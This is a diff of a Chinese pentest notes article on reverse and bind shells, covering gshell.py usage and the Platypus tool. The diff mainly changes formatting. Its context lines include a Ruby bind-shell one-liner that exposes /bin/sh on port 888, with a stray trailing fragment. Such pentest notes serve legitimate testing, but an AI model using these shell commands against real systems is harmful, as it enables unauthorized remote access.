@@ -1,7 +1,7 @@
 ---
 layer: article
 title: Reverse/Bind Shells
-tags: tools,pentest
+tags: tools pentest
 ---
 
 在日常的渗透测试过程中，获得了webshell后往往会反弹shell，这里整理了几个工具。
@@ -179,8 +179,6 @@ evasion  gshell.py  LICENSE  mdextract  README.md  requirements.txt  setup.sh  s
 $ sudo ln -s $(pwd)/gshell.py /usr/local/bin/gshell.py && chmod +x /usr/local/bin/gshell.py
 ```
 
-
-
 ## 使用
 
 ~~~bash
@@ -239,8 +237,6 @@ Help Options:
   -h, --help            Show this help message and exit
 
 ~~~
-
-
 
 ## 实例
 
@@ -318,10 +314,8 @@ $ python gshell.py -b -p 888 -s ruby
 ruby -rsocket -e 'f=TCPServer.new(888);s=f.accept;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",s,s,s)'s)'
 ```
 
-
-
-
 # [Platypus](https://github.com/WangYihang/Platypus)
+
 ## 安装
 
 **仍在开发，待稳定更新**
